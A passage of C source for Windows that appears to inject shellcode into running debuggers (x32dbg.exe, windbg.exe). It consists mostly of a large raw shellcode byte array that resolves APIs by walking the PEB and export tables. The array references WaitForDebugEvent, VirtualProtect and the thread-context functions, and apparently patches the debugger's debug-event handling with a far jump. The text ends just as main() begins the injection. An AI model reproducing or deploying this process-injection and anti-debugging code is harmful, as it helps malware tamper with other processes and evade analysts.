#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetPIDfromProcessName(const WCHAR* ProcessName);
DWORD InjectDebugger(DWORD PID);

BYTE ShellCode[]= {0x55, 0x8b, 0xec, 0x81, 0xec, 0x18, 0x1, 0x0, 0x0, 0x53, 0x56, 0x57, 0xe8, 0xd8, 0x0, 0x0, 0x0, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x44, 0x65, 0x62, 0x75, 0x67, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x0, 0x0, 0x0, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x43, 0x6f, 0x6e, 0x74, 0x69, 0x6e, 0x75, 0x65, 0x44, 0x65, 0x62, 0x75, 0x67, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x0, 0x0, 0x4f, 0x70, 0x65, 0x6e, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x47, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x0, 0x0, 0x0, 0x0, 0x53, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x0, 0x0, 0x0, 0x0, 0x49, 0x73, 0x57, 0x6f, 0x77, 0x36, 0x34, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x44, 0x65, 0x62, 0x75, 0x67, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0x0, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x4, 0x58, 0x89, 0x85, 0x48, 0xff, 0xff, 0xff, 0x8b, 0x85, 0x48, 0xff, 0xff, 0xff, 0x89, 0x45, 0xfc, 0x64, 0xa1, 0x30, 0x0, 0x0, 0x0, 0x8b, 0x40, 0xc, 0x8b, 0x40, 0x14, 0x8b, 0x0, 0x8b, 0x0, 0x8b, 0x40, 0x10, 0x89, 0x85, 0x40, 0xff, 0xff, 0xff, 0x8b, 0x8d, 0x40, 0xff, 0xff, 0xff, 0x89, 0x4d, 0xf0, 0x8b, 0x55, 0xfc, 0x83, 0xc2, 0x14, 0x89, 0x95, 0x68, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xf0, 0x89, 0x45, 0xec, 0x8b, 0x4d, 0xec, 0x89, 0x8d, 0x6c, 0xff, 0xff, 0xff, 0x8b, 0x95, 0x6c, 0xff, 0xff, 0xff, 0xf, 0xb7, 0x2, 0x3d, 0x4d, 0x5a, 0x0, 0x0, 0x74, 0xc, 0xc7, 0x45, 0xf4, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x9f, 0x1, 0x0, 0x0, 0x8b, 0x8d, 0x6c, 0xff, 0xff, 0xff, 0x8b, 0x55, 0xec, 0x3, 0x51, 0x3c, 0x89, 0x55, 0x88, 0x8b, 0x45, 0x88, 0x81, 0x38, 0x50, 0x45, 0x0, 0x0, 0x74, 0xc, 0xc7, 0x45, 0xf4, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x79, 0x1, 0x0, 0x0, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x45, 0x88, 0x83, 0x7c, 0x10, 0x78, 0x0, 0x75, 0xc, 0xc7, 0x45, 0xf4, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x5b, 0x1, 0x0, 0x0, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x45, 0x88, 0x8b, 0x4d, 0xec, 0x3, 0x4c, 0x10, 0x78, 0x89, 0x4d, 0xa4, 0x8b, 0x55, 0xa4, 0x8b, 0x45, 0xec, 0x3, 0x42, 0x1c, 0x89, 0x85, 0x2c, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xa4, 0x8b, 0x55, 0xec, 0x3, 0x51, 0x20, 0x89, 0x95, 0x3c, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xa4, 0x8b, 0x4d, 0xec, 0x3, 0x48, 0x24, 0x89, 0x8d, 0x30, 0xff, 0xff, 0xff, 0xc7, 0x45, 0xcc, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x8b, 0x55, 0xcc, 0x83, 0xc2, 0x1, 0x89, 0x55, 0xcc, 0x8b, 0x45, 0xa4, 0x8b, 0x4d, 0xcc, 0x3b, 0x48, 0x1c, 0xf, 0x83, 0xf1, 0x0, 0x0, 0x0, 0x8b, 0x55, 0xcc, 0x8b, 0x85, 0x3c, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xec, 0x3, 0xc, 0x90, 0x89, 0x8d, 0x64, 0xff, 0xff, 0xff, 0xc7, 0x45, 0xd4, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x45, 0xa0, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x95, 0x68, 0xff, 0xff, 0xff, 0x3, 0x55, 0xd4, 0xf, 0xbe, 0x2, 0x89, 0x85, 0x38, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xd4, 0x83, 0xc1, 0x1, 0x89, 0x4d, 0xd4, 0x83, 0xbd, 0x38, 0xff, 0xff, 0xff, 0x0, 0x74, 0x2, 0xeb, 0xda, 0x8b, 0x95, 0x64, 0xff, 0xff, 0xff, 0x3, 0x55, 0xa0, 0xf, 0xbe, 0x2, 0x89, 0x85, 0x34, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xa0, 0x83, 0xc1, 0x1, 0x89, 0x4d, 0xa0, 0x83, 0xbd, 0x34, 0xff, 0xff, 0xff, 0x0, 0x74, 0x2, 0xeb, 0xda, 0x8b, 0x55, 0xd4, 0x3b, 0x55, 0xa0, 0x74, 0x9, 0xc7, 0x45, 0x84, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x48, 0xc7, 0x45, 0xd0, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x8b, 0x45, 0xd0, 0x83, 0xc0, 0x1, 0x89, 0x45, 0xd0, 0x8b, 0x4d, 0xd0, 0x3b, 0x4d, 0xd4, 0x7d, 0x27, 0x8b, 0x95, 0x68, 0xff, 0xff, 0xff, 0x3, 0x55, 0xd0, 0xf, 0xbe, 0x2, 0x8b, 0x8d, 0x64, 0xff, 0xff, 0xff, 0x3, 0x4d, 0xd0, 0xf, 0xbe, 0x11, 0x3b, 0xc2, 0x74, 0x9, 0xc7, 0x45, 0x84, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0xeb, 0xc8, 0xc7, 0x45, 0x84, 0x1, 0x0, 0x0, 0x0, 0x83, 0x7d, 0x84, 0x0, 0x74, 0x1e, 0x8b, 0x45, 0xcc, 0x8b, 0x8d, 0x30, 0xff, 0xff, 0xff, 0xf, 0xb7, 0x14, 0x41, 0x8b, 0x85, 0x2c, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xec, 0x3, 0xc, 0x90, 0x89, 0x4d, 0xf4, 0xeb, 0xc, 0xe9, 0xf7, 0xfe, 0xff, 0xff, 0xc7, 0x45, 0xf4, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x55, 0xfc, 0x89, 0x95, 0x5c, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xf0, 0x89, 0x45, 0xe8, 0x8b, 0x4d, 0xe8, 0x89, 0x8d, 0x60, 0xff, 0xff, 0xff, 0x8b, 0x95, 0x60, 0xff, 0xff, 0xff, 0xf, 0xb7, 0x2, 0x3d, 0x4d, 0x5a, 0x0, 0x0, 0x74, 0xc, 0xc7, 0x45, 0x94, 0x0, 0x0, 0x0, 0x0, 0xe9, 0xab, 0x1, 0x0, 0x0, 0x8b, 0x8d, 0x60, 0xff, 0xff, 0xff, 0x8b, 0x55, 0xe8, 0x3, 0x51, 0x3c, 0x89, 0x55, 0x80, 0x8b, 0x45, 0x80, 0x81, 0x38, 0x50, 0x45, 0x0, 0x0, 0x74, 0xc, 0xc7, 0x45, 0x94, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x85, 0x1, 0x0, 0x0, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x45, 0x80, 0x83, 0x7c, 0x10, 0x78, 0x0, 0x75, 0xc, 0xc7, 0x45, 0x94, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x67, 0x1, 0x0, 0x0, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x45, 0x80, 0x8b, 0x4d, 0xe8, 0x3, 0x4c, 0x10, 0x78, 0x89, 0x4d, 0x9c, 0x8b, 0x55, 0x9c, 0x8b, 0x45, 0xe8, 0x3, 0x42, 0x1c, 0x89, 0x85, 0x18, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0x9c, 0x8b, 0x55, 0xe8, 0x3, 0x51, 0x20, 0x89, 0x95, 0x28, 0xff, 0xff, 0xff, 0x8b, 0x45, 0x9c, 0x8b, 0x4d, 0xe8, 0x3, 0x48, 0x24, 0x89, 0x8d, 0x1c, 0xff, 0xff, 0xff, 0xc7, 0x45, 0xc0, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x8b, 0x55, 0xc0, 0x83, 0xc2, 0x1, 0x89, 0x55, 0xc0, 0x8b, 0x45, 0x9c, 0x8b, 0x4d, 0xc0, 0x3b, 0x48, 0x1c, 0xf, 0x83, 0xfd, 0x0, 0x0, 0x0, 0x8b, 0x55, 0xc0, 0x8b, 0x85, 0x28, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xe8, 0x3, 0xc, 0x90, 0x89, 0x8d, 0x58, 0xff, 0xff, 0xff, 0xc7, 0x45, 0xc8, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x45, 0x98, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x95, 0x5c, 0xff, 0xff, 0xff, 0x3, 0x55, 0xc8, 0xf, 0xbe, 0x2, 0x89, 0x85, 0x24, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xc8, 0x83, 0xc1, 0x1, 0x89, 0x4d, 0xc8, 0x83, 0xbd, 0x24, 0xff, 0xff, 0xff, 0x0, 0x74, 0x2, 0xeb, 0xda, 0x8b, 0x95, 0x58, 0xff, 0xff, 0xff, 0x3, 0x55, 0x98, 0xf, 0xbe, 0x2, 0x89, 0x85, 0x20, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0x98, 0x83, 0xc1, 0x1, 0x89, 0x4d, 0x98, 0x83, 0xbd, 0x20, 0xff, 0xff, 0xff, 0x0, 0x74, 0x2, 0xeb, 0xda, 0x8b, 0x55, 0xc8, 0x3b, 0x55, 0x98, 0x74, 0xc, 0xc7, 0x85, 0x7c, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x4e, 0xc7, 0x45, 0xc4, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x8b, 0x45, 0xc4, 0x83, 0xc0, 0x1, 0x89, 0x45, 0xc4, 0x8b, 0x4d, 0xc4, 0x3b, 0x4d, 0xc8, 0x7d, 0x2a, 0x8b, 0x95, 0x5c, 0xff, 0xff, 0xff, 0x3, 0x55, 0xc4, 0xf, 0xbe, 0x2, 0x8b, 0x8d, 0x58, 0xff, 0xff, 0xff, 0x3, 0x4d, 0xc4, 0xf, 0xbe, 0x11, 0x3b, 0xc2, 0x74, 0xc, 0xc7, 0x85, 0x7c, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xeb, 0xc, 0xeb, 0xc5, 0xc7, 0x85, 0x7c, 0xff, 0xff, 0xff, 0x1, 0x0, 0x0, 0x0, 0x83, 0xbd, 0x7c, 0xff, 0xff, 0xff, 0x0, 0x74, 0x1e, 0x8b, 0x45, 0xc0, 0x8b, 0x8d, 0x1c, 0xff, 0xff, 0xff, 0xf, 0xb7, 0x14, 0x41, 0x8b, 0x85, 0x18, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xe8, 0x3, 0xc, 0x90, 0x89, 0x4d, 0x94, 0xeb, 0xc, 0xe9, 0xeb, 0xfe, 0xff, 0xff, 0xc7, 0x45, 0x94, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x55, 0xfc, 0x83, 0xc2, 0x28, 0x52, 0x8b, 0x45, 0xf0, 0x50, 0xff, 0x55, 0xf4, 0x89, 0x45, 0xa8, 0x8b, 0x4d, 0xfc, 0x83, 0xc1, 0x50, 0x51, 0x8b, 0x55, 0xf0, 0x52, 0xff, 0x55, 0xf4, 0x89, 0x85, 0x14, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xfc, 0x83, 0xc0, 0x64, 0x50, 0x8b, 0x4d, 0xf0, 0x51, 0xff, 0x55, 0xf4, 0x8b, 0x55, 0xfc, 0x89, 0x82, 0xd0, 0x0, 0x0, 0x0, 0x8b, 0x45, 0xfc, 0x83, 0xc0, 0x78, 0x50, 0x8b, 0x4d, 0xf0, 0x51, 0xff, 0x55, 0xf4, 0x8b, 0x55, 0xfc, 0x89, 0x82, 0xd4, 0x0, 0x0, 0x0, 0x8b, 0x45, 0xfc, 0x5, 0x8c, 0x0, 0x0, 0x0, 0x50, 0x8b, 0x4d, 0xf0, 0x51, 0xff, 0x55, 0xf4, 0x8b, 0x55, 0xfc, 0x89, 0x82, 0xd8, 0x0, 0x0, 0x0, 0x8b, 0x45, 0xfc, 0x8b, 0x4d, 0xa8, 0x89, 0x88, 0xc8, 0x0, 0x0, 0x0, 0x8b, 0x55, 0xfc, 0x8b, 0x85, 0x14, 0xff, 0xff, 0xff, 0x89, 0x82, 0xcc, 0x0, 0x0, 0x0, 0x8b, 0x4d, 0xfc, 0x81, 0xc1, 0xa0, 0x0, 0x0, 0x0, 0x89, 0x8d, 0x50, 0xff, 0xff, 0xff, 0x8b, 0x55, 0xf0, 0x89, 0x55, 0xe4, 0x8b, 0x45, 0xe4, 0x89, 0x85, 0x54, 0xff, 0xff, 0xff, 0x8b, 0x8d, 0x54, 0xff, 0xff, 0xff, 0xf, 0xb7, 0x11, 0x81, 0xfa, 0x4d, 0x5a, 0x0, 0x0, 0x74, 0xc, 0xc7, 0x45, 0xb0, 0x0, 0x0, 0x0, 0x0, 0xe9, 0xb7, 0x1, 0x0, 0x0, 0x8b, 0x85, 0x54, 0xff, 0xff, 0xff, 0x8b, 0x4d, 0xe4, 0x3, 0x48, 0x3c, 0x89, 0x8d, 0x78, 0xff, 0xff, 0xff, 0x8b, 0x95, 0x78, 0xff, 0xff, 0xff, 0x81, 0x3a, 0x50, 0x45, 0x0, 0x0, 0x74, 0xc, 0xc7, 0x45, 0xb0, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x8b, 0x1, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x6b, 0xc8, 0x0, 0x8b, 0x95, 0x78, 0xff, 0xff, 0xff, 0x83, 0x7c, 0xa, 0x78, 0x0, 0x75, 0xc, 0xc7, 0x45, 0xb0, 0x0, 0x0, 0x0, 0x0, 0xe9, 0x6a, 0x1, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x6b, 0xc8, 0x0, 0x8b, 0x95, 0x78, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xe4, 0x3, 0x44, 0xa, 0x78, 0x89, 0x45, 0x90, 0x8b, 0x4d, 0x90, 0x8b, 0x55, 0xe4, 0x3, 0x51, 0x1c, 0x89, 0x95, 0x0, 0xff, 0xff, 0xff, 0x8b, 0x45, 0x90, 0x8b, 0x4d, 0xe4, 0x3, 0x48, 0x20, 0x89, 0x8d, 0x10, 0xff, 0xff, 0xff, 0x8b, 0x55, 0x90, 0x8b, 0x45, 0xe4, 0x3, 0x42, 0x24, 0x89, 0x85, 0x4, 0xff, 0xff, 0xff, 0xc7, 0x45, 0xb4, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x8b, 0x4d, 0xb4, 0x83, 0xc1, 0x1, 0x89, 0x4d, 0xb4, 0x8b, 0x55, 0x90, 0x8b, 0x45, 0xb4, 0x3b, 0x42, 0x1c, 0xf, 0x83, 0xfd, 0x0, 0x0, 0x0, 0x8b, 0x4d, 0xb4, 0x8b, 0x95, 0x10, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xe4, 0x3, 0x4, 0x8a, 0x89, 0x85, 0x4c, 0xff, 0xff, 0xff, 0xc7, 0x45, 0xbc, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x45, 0x8c, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x8d, 0x50, 0xff, 0xff, 0xff, 0x3, 0x4d, 0xbc, 0xf, 0xbe, 0x11, 0x89, 0x95, 0xc, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xbc, 0x83, 0xc0, 0x1, 0x89, 0x45, 0xbc, 0x83, 0xbd, 0xc, 0xff, 0xff, 0xff, 0x0, 0x74, 0x2, 0xeb, 0xda, 0x8b, 0x8d, 0x4c, 0xff, 0xff, 0xff, 0x3, 0x4d, 0x8c, 0xf, 0xbe, 0x11, 0x89, 0x95, 0x8, 0xff, 0xff, 0xff, 0x8b, 0x45, 0x8c, 0x83, 0xc0, 0x1, 0x89, 0x45, 0x8c, 0x83, 0xbd, 0x8, 0xff, 0xff, 0xff, 0x0, 0x74, 0x2, 0xeb, 0xda, 0x8b, 0x4d, 0xbc, 0x3b, 0x4d, 0x8c, 0x74, 0xc, 0xc7, 0x85, 0x74, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x4e, 0xc7, 0x45, 0xb8, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x8b, 0x55, 0xb8, 0x83, 0xc2, 0x1, 0x89, 0x55, 0xb8, 0x8b, 0x45, 0xb8, 0x3b, 0x45, 0xbc, 0x7d, 0x2a, 0x8b, 0x8d, 0x50, 0xff, 0xff, 0xff, 0x3, 0x4d, 0xb8, 0xf, 0xbe, 0x11, 0x8b, 0x85, 0x4c, 0xff, 0xff, 0xff, 0x3, 0x45, 0xb8, 0xf, 0xbe, 0x8, 0x3b, 0xd1, 0x74, 0xc, 0xc7, 0x85, 0x74, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xeb, 0xc, 0xeb, 0xc5, 0xc7, 0x85, 0x74, 0xff, 0xff, 0xff, 0x1, 0x0, 0x0, 0x0, 0x83, 0xbd, 0x74, 0xff, 0xff, 0xff, 0x0, 0x74, 0x1e, 0x8b, 0x55, 0xb4, 0x8b, 0x85, 0x4, 0xff, 0xff, 0xff, 0xf, 0xb7, 0xc, 0x50, 0x8b, 0x95, 0x0, 0xff, 0xff, 0xff, 0x8b, 0x45, 0xe4, 0x3, 0x4, 0x8a, 0x89, 0x45, 0xb0, 0xeb, 0xc, 0xe9, 0xeb, 0xfe, 0xff, 0xff, 0xc7, 0x45, 0xb0, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x4d, 0xfc, 0x83, 0xc1, 0x3c, 0x51, 0x8b, 0x55, 0xf0, 0x52, 0xff, 0x55, 0xf4, 0x89, 0x85, 0xfc, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xfc, 0x5, 0xb4, 0x0, 0x0, 0x0, 0x50, 0x8b, 0x4d, 0xf0, 0x51, 0xff, 0x55, 0xf4, 0x89, 0x85, 0xec, 0xfe, 0xff, 0xff, 0x8d, 0x95, 0xe8, 0xfe, 0xff, 0xff, 0x52, 0x6a, 0x40, 0x6a, 0xf, 0x8b, 0x45, 0xa8, 0x83, 0xe8, 0x7, 0x50, 0xff, 0x95, 0xfc, 0xfe, 0xff, 0xff, 0x89, 0x85, 0xf4, 0xfe, 0xff, 0xff, 0xc7, 0x85, 0xf8, 0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x8d, 0x8d, 0xf0, 0xfe, 0xff, 0xff, 0x51, 0x8b, 0x95, 0xf8, 0xfe, 0xff, 0xff, 0x52, 0xff, 0x55, 0xb0, 0x89, 0x85, 0xf4, 0xfe, 0xff, 0xff, 0x83, 0xbd, 0xf0, 0xfe, 0xff, 0xff, 0x0, 0x74, 0x6, 0xc6, 0x45, 0xfb, 0x23, 0xeb, 0x4, 0xc6, 0x45, 0xfb, 0x1b, 0x8b, 0x45, 0xa8, 0x83, 0xe8, 0x7, 0x89, 0x45, 0xd8, 0x8b, 0x8d, 0x48, 0xff, 0xff, 0xff, 0x89, 0x8d, 0x70, 0xff, 0xff, 0xff, 0xba, 0x1, 0x0, 0x0, 0x0, 0x85, 0xd2, 0x74, 0x71, 0x8b, 0x85, 0x70, 0xff, 0xff, 0xff, 0x89, 0x45, 0xac, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x45, 0xac, 0xf, 0xb6, 0xc, 0x10, 0x83, 0xf9, 0x54, 0x75, 0x43, 0xba, 0x1, 0x0, 0x0, 0x0, 0xc1, 0xe2, 0x0, 0x8b, 0x45, 0xac, 0xf, 0xb6, 0xc, 0x10, 0x83, 0xf9, 0x4f, 0x75, 0x2f, 0xba, 0x1, 0x0, 0x0, 0x0, 0xd1, 0xe2, 0x8b, 0x45, 0xac, 0xf, 0xb6, 0xc, 0x10, 0x83, 0xf9, 0x54, 0x75, 0x1c, 0xba, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc2, 0x3, 0x8b, 0x4d, 0xac, 0xf, 0xb6, 0x14, 0x1, 0x83, 0xfa, 0x4f, 0x75, 0x8, 0x8b, 0x45, 0xac, 0x89, 0x45, 0xdc, 0xeb, 0x11, 0x8b, 0x8d, 0x70, 0xff, 0xff, 0xff, 0x83, 0xc1, 0x1, 0x89, 0x8d, 0x70, 0xff, 0xff, 0xff, 0xeb, 0x86, 0xba, 0x1, 0x0, 0x0, 0x0, 0x85, 0xd2, 0x74, 0x47, 0x8b, 0x45, 0xdc, 0x89, 0x85, 0x44, 0xff, 0xff, 0xff, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x85, 0x44, 0xff, 0xff, 0xff, 0xf, 0xb6, 0xc, 0x10, 0x83, 0xf9, 0x55, 0x75, 0x1c, 0xba, 0x1, 0x0, 0x0, 0x0, 0xc1, 0xe2, 0x0, 0x8b, 0x85, 0x44, 0xff, 0xff, 0xff, 0xf, 0xb6, 0xc, 0x10, 0x81, 0xf9, 0x8b, 0x0, 0x0, 0x0, 0x75, 0x2, 0xeb, 0xb, 0x8b, 0x55, 0xdc, 0x83, 0xea, 0x1, 0x89, 0x55, 0xdc, 0xeb, 0xb0, 0x8a, 0x45, 0xdc, 0x88, 0x45, 0xe3, 0x8b, 0x4d, 0xdc, 0x81, 0xe1, 0x0, 0xff, 0x0, 0x0, 0xc1, 0xe9, 0x8, 0x88, 0x4d, 0xe2, 0x8b, 0x55, 0xdc, 0x81, 0xe2, 0x0, 0x0, 0xff, 0x0, 0xc1, 0xea, 0x10, 0x88, 0x55, 0xe1, 0x8b, 0x45, 0xdc, 0x25, 0x0, 0x0, 0x0, 0xff, 0xc1, 0xe8, 0x18, 0x88, 0x45, 0xe0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x0, 0x8b, 0x45, 0xd8, 0xc6, 0x4, 0x10, 0xea, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xc1, 0xe1, 0x0, 0x8b, 0x55, 0xd8, 0x8a, 0x45, 0xe3, 0x88, 0x4, 0xa, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xd1, 0xe1, 0x8b, 0x55, 0xd8, 0x8a, 0x45, 0xe2, 0x88, 0x4, 0xa, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xd1, 0x3, 0x8b, 0x45, 0xd8, 0x8a, 0x4d, 0xe1, 0x88, 0xc, 0x10, 0xba, 0x1, 0x0, 0x0, 0x0, 0xc1, 0xe2, 0x2, 0x8b, 0x45, 0xd8, 0x8a, 0x4d, 0xe0, 0x88, 0xc, 0x10, 0xba, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc2, 0x5, 0x8b, 0x4d, 0xd8, 0x8a, 0x55, 0xfb, 0x88, 0x14, 0x1, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc8, 0x6, 0x8b, 0x55, 0xd8, 0xc6, 0x4, 0xa, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc8, 0x0, 0x8b, 0x55, 0xa8, 0xc6, 0x4, 0xa, 0xeb, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc1, 0xe0, 0x0, 0x8b, 0x4d, 0xa8, 0xc6, 0x4, 0x1, 0xf7, 0x5f, 0x5e, 0x5b, 0x8b, 0xe5, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x55, 0x8b, 0xec, 0x81, 0xec, 0xe8, 0x2, 0x0, 0x0, 0x53, 0x56, 0x57, 0xe8, 0x4, 0x0, 0x0, 0x0, 0x54, 0x4f, 0x54, 0x4f, 0x58, 0x89, 0x45, 0xf4, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x68, 0x8b, 0x4d, 0xf4, 0x89, 0x4d, 0xf8, 0xba, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc2, 0x0, 0x8b, 0x4d, 0xf8, 0xf, 0xb6, 0x14, 0x1, 0x83, 0xfa, 0x4c, 0x75, 0x43, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc1, 0xe0, 0x0, 0x8b, 0x4d, 0xf8, 0xf, 0xb6, 0x14, 0x1, 0x83, 0xfa, 0x6f, 0x75, 0x2f, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xd1, 0xe0, 0x8b, 0x4d, 0xf8, 0xf, 0xb6, 0x14, 0x1, 0x83, 0xfa, 0x61, 0x75, 0x1c, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x6b, 0xc8, 0x3, 0x8b, 0x55, 0xf8, 0xf, 0xb6, 0x4, 0xa, 0x83, 0xf8, 0x64, 0x75, 0x8, 0x8b, 0x4d, 0xf8, 0x89, 0x4d, 0xfc, 0xeb, 0xb, 0x8b, 0x55, 0xf4, 0x83, 0xea, 0x1, 0x89, 0x55, 0xf4, 0xeb, 0x8f, 0x8b, 0x45, 0xfc, 0x8b, 0x88, 0xc8, 0x0, 0x0, 0x0, 0x83, 0xc1, 0x2, 0x89, 0x4d, 0xec, 0x8b, 0x55, 0xc, 0x52, 0x8b, 0x45, 0x8, 0x50, 0xff, 0x55, 0xec, 0x89, 0x45, 0xe8, 0x8b, 0x4d, 0x8, 0x81, 0x79, 0xc, 0x4, 0x0, 0x0, 0x80, 0xf, 0x85, 0x9a, 0x0, 0x0, 0x0, 0x8b, 0x55, 0x8, 0x8b, 0x42, 0x8, 0x50, 0x6a, 0x0, 0x68, 0xff, 0xff, 0x1f, 0x0, 0x8b, 0x4d, 0xfc, 0x8b, 0x91, 0xd0, 0x0, 0x0, 0x0, 0xff, 0xd2, 0x89, 0x45, 0xf0, 0xc7, 0x85, 0x18, 0xfd, 0xff, 0xff, 0x3f, 0x0, 0x1, 0x0, 0x8d, 0x85, 0x18, 0xfd, 0xff, 0xff, 0x50, 0x8b, 0x4d, 0xf0, 0x51, 0x8b, 0x55, 0xfc, 0x8b, 0x82, 0xd4, 0x0, 0x0, 0x0, 0xff, 0xd0, 0xc7, 0x85, 0x30, 0xfd, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x85, 0x1c, 0xfd, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x8d, 0x8d, 0x18, 0xfd, 0xff, 0xff, 0x51, 0x8b, 0x55, 0xf0, 0x52, 0x8b, 0x45, 0xfc, 0x8b, 0x88, 0xd8, 0x0, 0x0, 0x0, 0xff, 0xd1, 0x89, 0x45, 0xe4, 0x68, 0x2, 0x0, 0x1, 0x0, 0x8b, 0x55, 0x8, 0x8b, 0x42, 0x8, 0x50, 0x8b, 0x4d, 0x8, 0x8b, 0x51, 0x4, 0x52, 0x8b, 0x45, 0xfc, 0x8b, 0x88, 0xcc, 0x0, 0x0, 0x0, 0xff, 0xd1, 0x8b, 0x55, 0xc, 0x52, 0x8b, 0x45, 0x8, 0x50, 0x8b, 0x4d, 0xfc, 0x8b, 0x91, 0xc8, 0x0, 0x0, 0x0, 0xff, 0xd2, 0x8b, 0x45, 0xe8, 0x5f, 0x5e, 0x5b, 0x8b, 0xe5, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc};



int main()
{
	DWORD PIDx32 = GetPIDfromProcessName(L"x32dbg.exe");
	DWORD PIDwindbg = GetPIDfromProcessName(L"windbg.exe");

	DWORD Status;

	if (PIDx32) {
		printf("Found X32 debugger\n");
		printf("injecting the shellcode\n");
